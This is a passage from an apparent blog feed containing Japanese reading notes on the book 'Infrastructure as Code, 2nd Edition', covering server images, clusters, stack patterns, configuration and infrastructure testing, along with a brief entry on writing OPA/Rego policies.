Teams「チーム間でのサーバーイメージの提供と使用」は、サーバーイメージを異なるチーム間で共有する際のベストプラクティスに焦点を当てています。このセクションは、サーバーイメージを中央チームが作成し、他のチームが使用する場合のダイナミクスを明確に説明しています。イメージのバージョン管理と共有に関する洞察は、大規模な組織における効果的なインフラ管理に特に関連しています。私が以前関わったプロジェクトでは、チーム間でサーバーイメージを共有することで、作業の重複を防ぎ、一貫性を保つことができました。Handling Major Changes to an Image「イメージの大きな変更を扱う」セクションは、サーバーイメージに対する大規模な変更を適切に管理する方法に関する重要な洞察を提供しています。このセクションでは、大きな変更をセマンティックバージョニングを使用して管理することの重要性が強調されています。私の経験では、サーバーイメージに大きな変更を加える際には、特に慎重なテストと段階的な導入が重要です。これにより、変更による影響を最小限に抑え、システムの安定性を保つことができます。Using a Pipeline to Test and Deliver a Server Image「サーバーイメージをテストおよび配信するためのパイプラインの使用」セクションは、サーバーイメージのライフサイクルを自動化し、品質を確保するための強力なアプローチを提供しています。パイプラインを通じてサーバーイメージを構築、テスト、配信することは、継続的な改善と効率化のための鍵です。私の経験では、CI/CDパイプラインを使用することで、サーバーイメージの作成と更新が格段に効率的になり、システムの全体的な信頼性が向上します。Using Multiple Server Images「複数のサーバーイメージの使用」セクションは、異なる環境や用途に合わせて複数のサーバーイメージを維持する必要性を説明しています。異なるプラットフォーム、オペレーティングシステム、ハードウェアアーキテクチャに対応するためのサーバーイメージの管理は、特に複雑なインフラストラクチャを持つ組織において重要です。私の経験では、特定の役割や要件に合わせてサーバーイメージを最適化することで、運用の効率を大幅に向上させることが可能です。サーバーイメージの管理に関するこの章の総括として、サーバーイメージをコードとして扱うことの利点が明確に示されています。自動化されたプロセスを通じてサーバーイメージを維持し、定期的に更新することで、インフラストラクチャの効率性とセキュリティが大きく向上することが示されています。14. Building Clusters As Code (クラスターをコードとして構築する)この章は、クラスターをコードとして構築する方法について詳しく解説しています。ソフトウェアエンジニアリングの経験から、このアプローチの強みは、システムの柔軟性と再現性にあります。KubernetesやAWS ECSなどの例が挙げられ、クラスター管理の複雑さを隠蔽しながらも、コードを介して制御可能であることが強調されています。Figure 14-1. An application cluster creates a layer between infrastructure resources and the applications running on them より引用Application Cluster Solutionsアプリケーションクラスターのソリューションに関しては、クラウドベースのサービスとオンプレミスのソリューション間の選択肢を詳細に検討しています。私の経験では、クラウドサービスは迅速な展開と低い初期コストを提供しますが、長期的にはカスタマイズの柔軟性とコントロールの観点で限界があります。一方で、オンプレミスソリューションは初期設定が複雑であり、維持管理のコストが高くなる可能性がありますが、長期的にはより制御可能で安定しています。Cluster as a Serviceクラウドプラットフォームが提供するCluster as a Service は、設定や管理の簡素化を可能にします。しかし、クラウド固有のサービスに依存することのリスクも伴います。この点は、多くのプロジェクトで検討すべき重要なトレードオフです。Packaged Cluster Distributionパッケージ化されたクラスター配布は、よりカスタマイズ可能で、組織固有のニーズに合わせた設定が可能です。Kubernetesのようなオープンソースソリューションの利用は、柔軟性をもたらしますが、メンテナンスとサポートにおいて自組織のリソースを要求します。Stack Topologies for Application Clustersアプリケーションクラスターのスタックトポロジーについては、モノリシックなスタックと分散型スタックの両方が詳述されています。私の観点からは、モノリシックなアプローチは小規模なプロジェクトや初期段階でのプロトタイピングに適しています。しかし、規模が大きくなると、スタックを分割し、各機能を別々に管理することで、より効率的な運用と拡張性が得られます。特に大規模なシステムでは、分散型のアプローチがシステムの複雑さを管理しやすくします。Monolithic Stack Using Cluster as a Serviceモノリシック・スタックを使用する場合、初期段階では管理が簡単ですが、規模が大きくなるにつれて、複雑さとリスクが増大します。このアンチパターンは、特に大規模なシステムでの問題につながり得ます。Monolithic Stack for a Packaged Cluster Solutionパッケージ化されたクラスター・ソリューションにおけるモノリシック・スタックは、より管理が複雑ですが、カスタマイズの自由度が高いです。インフラのスタックとアプリケーションのクラスターが別々に管理される点は、運用において重要な考慮事項です。Pipeline for a Monolithic Application Cluster Stackモノリシック・アプリケーション・クラスター・スタックのパイプラインは、インフラとアプリケーションの両方に影響を及ぼします。この一元管理は、変更の際に大きな影響を及ぼす可能性があります。Example of Multiple Stacks for a Clusterクラスターのための複数スタックの例は、変更の影響を局所化し、リスクを分散させるのに役立ちます。スタックを分割することで、より効率的かつ安全に変更を行うことができます。Sharing Strategies for Application Clustersアプリケーションクラスターの共有戦略に関するセクションは、特に多様な環境やニーズを持つ組織にとって重要です。一つの大きなクラスターをすべての用途に使用するのではなく、目的やチームごとにクラスターを分割することで、セキュリティ、パフォーマンス、および管理の観点から優れた結果を得ることができます。私の経験上、チームやプロジェクトごとに専用のクラスターを用意することは、リソースの効率的な利用とセキュリティリスクの軽減に繋がります。また、ガバナンスやコンプライアンスの要件に基づいてクラスターを分割することは、特に規制の厳しい業界での運用において重要です。One Big Cluster for Everything全てを一つの大きなクラスターで管理するアプローチは、シンプルさと効率の面で魅力的ですが、変更管理の複雑さやリスクの集中が懸念されます。Separate Clusters for Delivery Stages異なるデリバリー段階ごとに別々のクラスターを用意する戦略は、リスクの分散と環境間の独立性を提供します。これにより、特定の環境に特化した最適化が可能になります。Clusters for Governanceガバナンスのためのクラスターは、特定のコンプライアンス要件を持つアプリケーションに対して、より厳格な環境を提供することができます。これにより、セキュリティとパフォーマンスの向上が期待できます。Clusters for Teamsチームごとのクラスターは、チームの特定のニーズに合わせたカスタマイズを可能にします。これは、チームの生産性を向上させると同時に、システムの全体的な効率を高めることができます。Service Meshサービスメッシュは、アプリケーション間の通信を効率化し、複雑な分散システムにおける管理を容易にします。これにより、開発者はアプリケーションのロジックに集中でき、インフラストラクチャの詳細から解放されます。Infrastructure for FaaS ServerlessFaaS Serverlessのインフラストラクチャは、従来のアプリケーション・ホスティングとは異なり、イベント駆動のコード実行をサポートします。これにより、負荷が不規則なワークロードに対して、高い効率性とスケーラビリティが得られます。この章の総括として、クラスターをコードとして構築するアプローチは、アプリケーションをサポートするためのインフラストラクチャを効率的に管理するための強力な方法です。個々の技術や戦略の選択は、組織の特定のニーズに基づいて行われるべきです。まとめサーバーとその他のアプリケーションランタイムプラットフォームの扱いに焦点を当てています。このセクションは、現代のインフラストラクチャ管理における重要なトピックを深く掘り下げており、Infrastructure as Code (IaC) の実践において不可欠な洞察を提供しています。特に、アプリケーションクラスターの構築、スタックトポロジーの設計、そしてクラスター共有戦略の選択に関する章は、システムのスケーラビリティと耐障害性を高める方法論を提示しています。これらの章では、クラウドサービスとオンプレミスソリューションの利点と欠点が比較され、プロジェクトの要件に応じた適切な選択を行うための洞察が提供されています。本書は、インフラストラクチャをコードとして扱うことの重要性を強調し、変更管理、セキュリティ、およびコンプライアンスを効率的に運用するための具体的な手法を提供しています。また、サービスメッシュやサーバーレスアーキテクチャなどの先進的なトピックにも言及し、読者がこれらの技術を理解し、適切に活用するためのガイダンスを提供しています。全体を通して、この部分は、インフラストラクチャの自動化とオーケストレーションに関する実用的なアプローチを強調しており、読者がより堅牢で効率的なシステムを構築するための知識を深めるのに役立ちます。結果として、サーバーとアプリケーションランタイムプラットフォームの管理において、より戦略的で洗練されたアプローチを採用するための基盤を築くことができます。Infrastructure as Code, 2nd Editionの読書感想文Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/16/124030","isoDate":"2023-11-16T03:40:30.000Z","dateMiliSeconds":1700106030000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"ツールごとのOPA/Regoの書き方","contentSnippet":"RegoとはKubernetesやTerraformの静的解析で既存のルールでは足りないときや自分でカスタマイズしたいときにRegoというポリシー言語でコードを書くhttps://www.openpolicyagent.org/docs/latest/policy-language/ Regoを利用できるツールの例conftesthttps://www.conftest.dev/自分で全部書くtrivyhttps://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/cust...","link":"https://zenn.dev/tayusa/articles/63f286f4733a87","isoDate":"2023-11-16T03:05:53.000Z","dateMiliSeconds":1700103953000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Infrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文","contentSnippet":"はじめに前回の続きで第二部のWorking With Infrastructure Stacks (インフラストラクチャスタックとの作業)という部の読書感想文になります。まず、Stackってなんやねんと思うと思います。僕も思っています。前回の記事syu-m-5151.hatenablog.com次回の記事syu-m-5151.hatenablog.com書籍のリンクInfrastructure as Code: Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon第二部 目次II. Working With Infrastructure Stacks (インフラストラクチャスタックとの作業)5. Building Infrastructure Stacks As Code (インフラストラクチャスタックをコードとして構築する)   - インフラストラクチャスタックをコードで構築するプロセスとテクニックを紹介します。6. Building Environments With Stacks (スタックで環境を構築する)   - スタックを使用して異なる環境を構築する方法を解説します。7. Configuring Stack Instances (スタックインスタンスの設定)   - 個々のスタックインスタンスを設定するための戦略とベストプラクティスを提供します。8. Core Practice: Continuously Test And Deliver (コアプラクティス：継続的なテストと提供)   - インフラストラクチャコードの継続的なテストと提供の重要性について論じます。9. Testing Infrastructure Stacks (インフラストラクチャスタックのテスト)   - インフラストラクチャスタックのテスト手法と戦略を紹介します。II. Working With Infrastructure Stacks (インフラストラクチャスタックとの作業)5. Building Infrastructure Stacks As Code (インフラストラクチャスタックをコードとして構築する)この章はインフラストラクチャスタックをコードとして構築する方法に焦点を当てています。Figure 5-1. An infrastructure stack is a collection of infrastructure elements managed as a group より引用What Is an Infrastructure Stack?インフラストラクチャスタックは、インフラリソースを単位として定義、プロビジョニングし、更新する集合体であり、スタック管理ツールによって一括で管理されます。スタック管理ツールには、HashiCorp Terraform, AWS CloudFormation, Azure Resource Manager, Google Cloud Deployment Manager, Pulumi などがあります。AnsibleやChefなどの内部を上手に操作するツールはこれらには含まれません。そして、このStack管理ツールは私は現実ではほぼ使いません。Infrastructure as Codeのこれまでとこれから、わたしたちにIaCはまだ早かったのかもしれないなどでもStackツールって表現しているようなことはありませんだからといって本書の価値が下がるということは一切ありません。Stack Codeスタックコードはスタックの構造を記述するソースコードであり、インフラプラットフォームから提供されるリソースやサービスを宣言的に記述します。スタックコードは、インフラストラクチャの各要素をどのようにコード化するかを明確にし、変更が行われる際には、このコードに基づいてインスタンスが更新されます。Stack Instanceスタックインスタンスは、特定のスタックコードに基づいてプロビジョニングされたインフラリソースの具体的な実体です。インフラストラクチャの状態がコードで明確に定義されることにより、再現性と整合性を保つことが可能です。Configuring Servers in a Stackサーバー設定はインフラコードベースの重要な部分であり、コンテナベースやサーバーレスアーキテクチャではないシステムにおいて特に多くのコードが必要になります。Direct Infrastructure Management Languages & Abstraction-Level Infrastructure Languages直接インフラ管理言語は、インフラストラクチャプラットフォームが提供するリソースに直接対応し、抽象化レベルのインフラ言語は、基盤となるプラットフォームが提供するリソースに直接対応していないエンティティを定義します。たとえば、PaaSプラットフォームやパッケージ化されたクラスターは、より高い抽象レベルでリソースを管理する能力を提供します。Patterns and Antipatterns for Structuring Stacksインフラストラクチャスタックの構造化において取るべき適切なアプローチと避けるべき間違ったアプローチについて説明しています。Antipattern: Monolithic Stack (アンチパターン: モノリシックスタック)モノリシックスタックは、多くの要素を含む過大なインフラストラクチャスタックで、その管理が困難です。これはシステムの拡大とともに発生しやすく、一つのプロジェクトに新しい要素を単純に追加することで成長します。しかし、その結果、スタックのプロビジョニングや更新に時間がかかりすぎたり、変更時のリスクが高まるなどの問題が生じます。Pattern: Application Group Stack (パターン: アプリケーショングループスタック)アプリケーショングループスタックは、関連する複数のアプリケーションまたはサービスのインフラストラクチャをグループ化して管理します。これにより、システム内の複数のアプリケーションを単一の単位として扱い、管理を簡素化できます。しかし、アプリケーションごとの変更のリズムが異なる場合、不必要なオーバーヘッドやリスクを招く可能性があります。Pattern: Service Stack (パターン: サービススタック)サービススタックでは、デプロイ可能な各アプリケーションコンポーネントのインフラストラクチャを個別のスタックで管理します。これにより、サービスごとの変更を独立して行えるため、変更管理のリスクが局限され、チームがそれぞれのソフトウェアに関連するインフラストラクチャを所有することが容易になります。Pattern: Micro Stack (パターン: マイクロスタック)マイクロスタックでは、単一サービスのインフラストラクチャを複数のスタックに分割します。これにより、サービスの異なる部分が異なるレートで変更されたり、管理が別々に簡単になるなど、さらなる柔軟性と管理のしやすさを提供します。ただし、スタックの数が増えることで生じる追加の複雑性を管理する新たな課題もあります。これらのパターンとアンチパターンは、スタックのサイズと構造をどのように決定するかについての考慮点を提供し、スタックの管理とスケーラビリティのバランスを最適化する方法を示しています。この章では、インフラストラクチャの自動化におけるスタックの重要性と管理方法を明確にし、スタックの構築と管理に関する技術的な洞察と実践的な指針を提供します。6. Building Environments With Stacks (スタックで環境を構築する)インフラストラクチャスタックを用いて環境を構築する方法について詳しく説明されています。この章は、ソフトウェア開発と運用の現場で経験した実践的な課題と、それを解決するためのインフラコード化の知見を踏まえ、環境構築の理論と手法を提供します。Figure 6-1. ShopSpinner delivery environmentsより引用What Environments Are All About環境は特定の目的に沿って組織されたソフトウェアとインフラリソースの集合体であり、例えばテストフェーズをサポートするため、または地理的な地域でサービスを提供するために使用されます。スタックまたはスタックのセットは、これらのインフラリソースのコレクションを定義し、管理する手段であり、環境を実装するために使用されます。\\"An environment is a collection of software and infrastructure resources organized around a particular purpose, such as to support a testing phase, or to provide service in a geographical region.\\" (環境とは、テストフェーズをサポートしたり、地理的な地域でサービスを提供したりするなど、特定の目的の周りに組織されたソフトウェアとインフラリソースの集合体です。)Patterns for Building Environments環境を構築するためのパターンでは、環境とスタックの実装方法についてのアンチパターンとパターンが説明されています。Antipattern: Multiple-Environment Stack (アンチパターン: 複数環境スタック)複数環境スタックは、単一のスタックインスタンスとして複数の環境のインフラストラクチャを定義し、管理するものです。これは、新しいスタックツールを学習している際に直感的に行われがちな構造ですが、コード内のミスや依存関係の予期せぬ発生により、インスタンス内の全てが影響を受けるリスクがあります。Antipattern: Copy-Paste Environments (アンチパターン: コピペ環境)コピペ環境アンチパターンは、各インフラストラクチャスタックインスタンスに対して別々のスタックソースコードプロジェクトを使用するものです。これにより、コードの重複や一貫性の欠如が生じ、環境間での構成のズレによるテストやデプロイメントプロセスの信頼性が低下する可能性があります。Pattern: Reusable Stack (パターン: 再利用可能スタック)再利用可能スタックは、複数のスタックインスタンスを生成するために使用されるインフラソースコードプロジェクトです。これにより、スタックコードに加えた変更を一つのインスタンスでテストし、その後同じコードバージョンを使用して複数の追加インスタンスを作成または更新することができます。この章は、インフラストラクチャスタックを使用して環境を効果的に実装するための戦略と、それに伴う潜在的な問題を特定し、解決する方法を提供します。インフラストラクチャスタックを活用した環境構築は、ソフトウェアのリリースプロセスのサポートや、地理的な分散によるスケーラビリティと耐障害性の向上に貢献します。7. Configuring Stack Instances (スタックインスタンスの設定)再利用可能なインフラスタックを複数の環境で効率的に運用するための構成管理について議論しています。この章では、インフラスタックのカスタマイズが必要なシナリオを想定し、環境ごとのユニークな設定をどのように実現するかを検討しています。Figure 7-1. Using the same code with different parameter values for each environment より引用Using Stack Parameters to Create Unique Identifiersスタックコードにパラメータを渡すことで、同一プロジェクトから生成される複数のスタックインスタンスがIDの衝突を避けられるよう、一意性の確保を目指しています。このアプローチは、インフラストラクチャのコード化の原則「全てを再現可能にする」を実現する上で重要な役割を果たします。\\"Consistency across environments is one of the main drivers of Infrastructure as Code.\\" (環境間の一貫性は、インフラストラクチャのコード化の主要な推進力の一つです。)Patterns for Configuring Stacksスタック構成に関するパターンでは、スタックツールに構成値を効果的に渡すための複数のアンチパターンとパターンが提示されています。Antipattern: Manual Stack Parameters (アンチパターン: 手動スタックパラメータ)手動でパラメータを入力する方法は、簡便ですが、誤入力のリスクがあり、チーム内での構成値の一貫性を担保するのが難しいです。Pattern: Stack Environment Variables (パターン: スタック環境変数)スタックツールが使用するパラメータ値を環境変数として設定することは、実行前のセットアップを容易にし、またパラメータの可視性を向上させますが、その管理は別の機構に依存します。Pattern: Scripted Parameters (パターン: スクリプト化されたパラメータ)パラメータ値をスクリプトに埋め込むことで、環境ごとの一貫性を保証することができ、手動入力時の問題を避けられます。しかし、シークレット情報の扱いには注意が必要です。Pattern: Stack Configuration Files (パターン: スタック構成ファイル)パラメータファイルを用いることで、環境ごとにカスタマイズされた構成をバージョン管理することができます。これは、構成の監査と変更管理において非常に有効なアプローチです。Pattern: Wrapper Stack (パターン: ラッパースタック)ラッパースタックを用いることで、スタックコードの共有を促進し、変更を段階的に配布することができますが、この方法は追加の複雑さをもたらす可能性があります。Pattern: Pipeline Stack Parameters (パターン: パイプラインスタックパラメータ)パイプラインツールを活用してスタックコードを環境に適用する場合、パイプラインの構成にパラメータ値を定義することで、一貫性を保ちつつ効率的に構成を管理できます。Pattern: Stack Parameter Registry (パターン: スタックパラメータレジストリ)中央のレジストリにパラメータ値を格納することで、スタックのインスタンス構成情報を一元管理し、システム全体の設定変更に対する可視性と監査性を向上させます。スタックの再利用は、一貫性のある構成管理を実現する上で重要です。異なるスタックインスタンスが大幅に異なる場合には、それぞれを異なるスタックとして定義することが推奨されます。この章を通じて、スタックパラメータの管理と適用のアプローチが多様であることが明らかになりました。特にセキュリティに関する配慮が必要な部分では、最初から安全な取り扱いを心がける必要があると強調されています。システムやチームの成熟度に応じて適切な構成管理のアプローチを選択することが重要だと感じます。環境やチーム間での一貫性を保ちつつ、セキュリティを確保するための実践的なアドバイスを得ることができました。8. Core Practice: Continuously Test And Deliver (コアプラクティス：継続的なテストと提供)継続的なテストとデリバリーはインフラストラクチャコードの品質を維持し、信頼性を高めるための不可欠な実践です。アジャイルの原則に沿い、小さな変更を頻繁にテストし、即座にフィードバックを得ることで、品質を段階的に向上させていくことが強調されています。このプラクティスは、開発者が直面する潜在的な問題を早期に特定し、修正することを可能にし、最終的にはより安定したインフラストラクチャの配信につながります。長期的には、このアプローチはリリースプロセスの効率化と、エラー発生時の迅速な対応を促進します。Why Continuously Test Infrastructure Code?継続的なテストは、インフラストラクチャを一貫して信頼できる状態に保つために不可欠です。インフラストラクチャが変化し続ける環境では、変更の配信を効果的に行う上で重要なテスト自動化のスイートを構築することが求められます。このプロセスは、開発から運用に至るまでのライフサイクル全体を通じてインフラストラクチャの品質を確保し、継続的な改善を促進するための基盤となります。テストの自動化は、未来の変更に対しても柔軟に対応できる堅牢なインフラを構築する上で、決定的な役割を果たします。What Continuous Testing Means継続的なテストは、品質をコードライティングプロセスに組み込むことで、問題を早期に発見し解決することを意味します。このアプローチは、開発者がコードを書く際にリアルタイムでフィードバックを得られるようにし、問題の迅速な特定と修正を可能にします。この即時性は、システム開発における迅速なイテレーションと改善を実現し、技術的負債の蓄積を避けることを目指します。What Should We Test with Infrastructure?インフラストラクチャのテストは、機能性だけでなく、セキュリティやコンプライアンス、パフォーマンスなど、幅広いリスクの管理を包括します。CDプロセスでは、これらのリスクをリリース前にテストし、潜在的な問題を事前に特定し修正することで、プロダクション環境へのリスクを最小限に抑えることを目指します。Challenges with Testing Infrastructure Codeインフラストラクチャコードのテストにはいくつかの課題があり、これらはしばしばデリバリーの速度と品質に影響を与えます。デクララティブなコードのテストが低価値であること、テストプロセスが遅いこと、そして依存関係による複雑さがそれらです。Challenge: Tests for Declarative Code Often Have Low Valueデクララティブなコードのテストは冗長な場合が多く、実際のリスクの特定や管理にはあまり寄与しません。テストはリスクを管理するためのものであり、単なるコードの繰り返しではないため、デクララティブなコードに対しては、より高いレベルのリスク分析とそれに基づいたテスト戦略が求められます。Challenge: Testing Infrastructure Code Is Slowインフラストラクチャコードのテストはプラットフォーム上でのインスタンスのプロビジョニングを必要とするため、遅延が生じる傾向があります。テストプロセスの速度を向上させるためには、小さなコンポーネントに分割し、依存関係を最小限に抑えることが重要です。Challenge: Dependencies Complicate Testing Infrastructure依存関係はインフラテストの複雑さを増大させます。モックやテストダブルなどを使用して依存関係をシミュレートすることで、テストの実施をより実用的かつ迅速にすることが可能です。Progressive Testing段階的なテストは、初期のシンプルなテストから始めて徐々に統合の範囲を広げる戦略です。テストピラミッドは、より低レベルのテストを多くし、高レベルの統合テストは少なくするべきだと提唱し、スイスチーズモデルは、複数のテストレイヤーが組み合わさることで、単一レイヤーの穴を補完することを示します。これらのモデルは、リスクを管理するために、どのステージでどのテストを行うべきかを考える上で役立ちます。Figure 8-1. Scope versus speed of progressive testing より引用Infrastructure Delivery PipelinesCDパイプラインは、プログレッシブテストとデリバリーを組み合わせたもので、自動化により一貫性を保ちます。パイプラインの各ステージは特定のトリガーやアクティビティを持ち、適切なスコープとプラットフォーム要素を備えています。パイプラインの構築には、適切なソフトウェアまたはサービスが必要ですが、これによってインフラストラクチャの変更が効率的に、かつ一貫して配信されることが保証されます。Testing in Productionプロダクションでのテストは、他の環境では再現できないリアルな条件下でのリスクを検証する機会を提供します。プロダクション環境には再現できない要素が多く存在し、これらを通じてリアルタイムでのリスク管理を実施することができます。プロダクションでのテストに伴うリスクを管理するためには、監視、可視性の向上、ゼロダウンタイムデプロイメント、プログレッシブデプロイメント、データ管理、カオスエンジニアリングなどの戦略が不可欠です。インフラストラクチャのテストは、その構築と運用の基盤です。この章ではインフラストラクチャのテストに関する一般的な課題とアプローチについて説明しましたが、テストとQAはインフラストラクチャアズコードの成功に不可欠なため、これらの分野に関するさらなる知識を深めることが推奨されます。9. Testing Infrastructure Stacks (インフラストラクチャスタックのテスト)9. Testing Infrastructure Stacksこの章の焦点は、インフラストラクチャスタックのテストにあります。現代のソフトウェア開発では、インフラストラクチャのコードもアプリケーションのコードと同様に継続的にテストされるべきであるという考え方が強調されています。これはSREの実践においても極めて重要で、システムの安定性と効率性を保つためには、テストの自動化と継続的な改善が不可欠です。Example Infrastructureここでは、具体的なインフラストラクチャの例としてShopSpinnerのケースが紹介されます。この例を通して、リアルなインフラストラクチャの構築と管理の課題を理解することができ、特に再利用可能なスタックの概念が実際のプロジェクト管理においてどのように役立つかが明らかになります。The Example StackShopSpinnerのスタックの具体的な構成を示すセクションです。ここでの重要なポイントは、効率的なリソース管理とスタックのモジュール化の重要性です。これらの概念は、大規模なシステムにおいてコードの再利用性とメンテナンス性を高めるために重要です。Pipeline for the Example Stackこのセクションでは、ShopSpinnerのインフラストラクチャスタックに対するパイプラインの設計について説明されています。パイプラインの構成は、継続的インテグレーション（CI）と継続的デリバリー（CD） の実践に欠かせない要素であり、効率的な開発プロセスを実現するためのキーです。Figure 9-1. Simplified example pipeline for a stack より引用Offline Testing Stages for Stacksオフラインテストは、インフラストラクチャスタックの開発段階において、コードの品質を確保するために非常に重要です。この段階では、ネットワーク接続や実際のリソースへのアクセスなしにテストを行います。Syntax Checkingシンタックスチェックは、最も基本的ながらも重要なテストの一つです。このプロセスは、コード内のタイポや文法の誤りを迅速に特定し、より大きな問題が発生する前に修正する機会を提供します。Offline Static Code Analysis静的コード分析は、より高度なエラー検出やコーディングスタイルの改善に役立ちます。これにより、コードの品質とセキュリティが大幅に向上します。Static Code Analysis with APIAPIを用いた静的コード分析は、特定のインフラストラクチャプラットフォームに対するコードの適合性をテストするために重要です。これにより、実際の環境へのデプロイ前に潜在的な問題を特定できます。Testing with a Mock APIモックAPIを使用するテストは、実際のAPIとの統合前に、コードが期待通りに機能するかどうかを検証するのに役立ちます。これは、特に大規模なシステムでの統合テストにおいて重要です。Online Testing Stages for Stacksオンラインテストは、実際のインフラストラクチャや外部サービスとの統合を伴うテストです。これにより、オフラインテストでは捉えきれない実際の環境での動作を確認できます。Preview: Seeing What Changes Will Be Made変更のプレビューは、実際にコードを適用する前に、どのような変更が行われるかを確認するプロセスです。これは、特にインフラストラクチャの変更に伴うリスクを軽減するために重要です。Verification: Making Assertions About Infrastructure Resourcesインフラストラクチャリソースに関するアサーションの作成は、スタックが正しく設定されていることを検証するための手段です。これにより、システムの整合性とパフォーマンスを保証できます。Outcomes: Proving Infrastructure Works Correctlyインフラストラクチャが正しく機能していることを証明するためのテストは、最終的なユーザーエクスペリエンスに直接関連するため、非常に重要です。これにより、実際の環境でのインフラストラクチャの振る舞いを確認できます。Using Test Fixtures to Handle Dependenciesテストフィクスチャを使用して依存関係を処理する方法は、テストプロセスの複雑さを軽減し、より継続的かつ効率的なテスト環境を構築するための効果的なアプローチです。Test Doubles for Upstream Dependencies上流依存関係に対するテストダブルは、実際の依存関係なしでスタックをテストするための仮想的な環境を提供します。これは、開発プロセスの柔軟性を大幅に高めます。Test Fixtures for Downstream Dependencies下流依存関係に対するテストフィクスチャは、他のスタックが利用するリソースを提供するスタックのテストに役立ちます。これにより、インフラストラクチャ間の統合テストの精度が向上します。Refactor Components So They Can Be Isolatedコンポーネントをリファクタリングして単独でテストできるようにすることは、コードの品質と保守性を向上させるために重要です。これにより、システム全体の堅牢性が向上します。Life Cycle Patterns for Test Instances of Stacksスタックのテストインスタンスのライフサイクルパターンは、テスト環境の管理と最適化に関する洞察を提供します。これにより、リソースの使用効率とテストプロセスの効率が向上します。Pattern: Persistent Test Stack持続的テストスタックパターンは、安定したテスト環境を提供するが、時間が経つにつれて問題が発生する可能性があります。継続的なメンテナンスと監視が必要です。Pattern: Ephemeral Test Stackこのセクションは、エフェメラルテストスタックのパターンに焦点を当て、テストのたびに新しいインスタンスを作成して破棄する方法を提案します。このアプローチは、クリーンな環境を保証し、過去のテストからの\\"クラッター\\"（不要なデータや設定）による影響を排除します。私の経験から言うと、この方法は、特に頻繁に変更されるコードベースにおいて、信頼性と一貫性のあるテスト結果を提供するのに非常に有効です。しかし、新しい環境を都度設定するための時間コストは考慮する必要があります。特に、大規模なインフラストラクチャの場合、セットアップに時間がかかり、フィードバックループを遅くする可能性があります。Antipattern: Dual Persistent and Ephemeral Stack Stagesここで取り上げられているのは、永続的スタックとエフェメラルスタックの両方を組み合わせたアンチパターンです。この方法は、理論上は早急なフィードバックと堅牢なテスト環境の両方を提供するはずですが、実際には両方のアプローチの欠点を引き受けることになります。例えば、永続的スタックのインスタンスが\\"ウェッジ状態\\"（変更によって不安定な状態）になると、エフェメラルスタックステージがその安全網となる可能性があります。しかし、これはリソースの二重消費を招くだけでなく、結局のところ、チームは永続的スタックの問題を解決するために時間を費やさなければならない場合があります。Pattern: Periodic Stack Rebuild定期的なスタック再構築のパターンは、永続的なテストスタックを定期的に再構築することで、リソースの使用量の蓄積や、更新プロセスの信頼性の低下を防ぐことを目的としています。このアプローチは、特にメモリやストレージがテストの実行に伴い徐々に消費される場合に効果的です。ただし、これは根本的な問題を覆い隠す一時的な解決策であり、問題の本質的な解決には至らないことに注意が必要です。Pattern: Continuous Stack Reset連続スタックリセットのパターンは、各テストステージの完了後にスタックインスタンスを自動的に破棄し再構築することで、常にクリーンな状態を保つことを目指しています。この方法は、テスト実行のたびに一から環境を構築する時間を節約できる一方で、背後で発生する問題を見落とすリスクがあります。例えば、バックグラウンドでのインスタンス破棄が失敗した場合、次回のテスト実行時に問題が顕在化する可能性があります。Test Orchestrationテストオーケストレーションに関しては、テストフィクスチャの作成、テストデータのロード、テストスタックインスタンスのライフサイクル管理、テストツールへのパラメータ提供、テストツールの実行、テスト結果の統合、テストインスタンス、フィクスチャ、データのクリーンアップなど、多岐にわたる活動が含まれます。このセクションは、これらの複雑なプロセスを効率的に管理するための実践的なガイダンスを提供しています。Support Local Testingローカルテストのサポートは、開発者が共有パイプラインや環境にコードをプッシュする前に自分でテストを実行できるようにすることを目的としています。これは、特にクラウドベースのインフラストラクチャで働く開発者にとっては不可欠です。ローカルでのテストは、より迅速なフィードバックを可能にし、開発プロセスの効率を大幅に向上させることができます。Avoid Tight Coupling with Pipeline Toolsパイプラインツールとの密接な結合を避けることは、テストオーケストレーションの柔軟性と再利用性を保つ上で非常に重要です。パイプラインツールにテストを強く結びつけると、テストのセットアップや実行をパイプライン外で行う際に困難が生じることがあります。テストオーケストレーションを独立したスクリプトまたはツールで実装することは、パイプラインオーケストレーションとテストオーケストレーションの関心を適切に分離するのに役立ちます。Test Orchestration Toolsテストオーケストレーションツールに関しては、多くのチームがカスタムスクリプトを書いてテストをオーケストレーションしています。これらのスクリプトは、Bashスクリプト、バッチファイル、Ruby、Pythonなど、さまざまな言語で記述されることがあります。しかし、特定のワークフローに特化して設計されたツール（例：Test Kitchen、Molecule）も存在しますが、自分のニーズに合わせて設定するのは難しいことがあります。この章全体を通して、インフラストラクチャスタックのテストに関する包括的な概観と、その実践的な実装について深く掘り下げられています。スタックコードのテストにはまだ十分に成熟したツールや実践が存在しない中、この章は、現在利用可能なツールやカスタムスクリプティングを活用して、これらの課題にどのように対処するかを示唆しています。これは、インフラストラクチャのテストプロセスに取り組む上での貴重な洞察を提供するものであり、非常に有用です。さいごに現代のソフトウェア開発と運用の中核となる要素、すなわちインフラストラクチャスタックの管理と運用について深く探究しています。このセクションは、インフラストラクチャコードの設計、開発、テスト、デプロイメントの各フェーズにおけるベストプラクティスと戦略を詳細に説明しており、現代のIT環境における効率性、スケーラビリティ、信頼性の実現に必要な知識とツールを提供します。特に注目すべきは、インフラストラクチャとアプリケーションの間の相互依存性の管理と、自動化されたテストプロセスの重要性に焦点を当てた点です。これらのトピックは、DevOps文化の中心であり、迅速かつ効率的なソフトウェアデリバリーを可能にする基盤となっています。また、パイプラインの設計とオーケストレーションのセクションは、コードの変更が生産環境にどのように流れるか、そしてそのプロセスをどのように最適化し、安全に保つかについての洞察を提供しています。この部分は、持続可能なインフラストラクチャ管理のための戦略的アプローチを明らかにし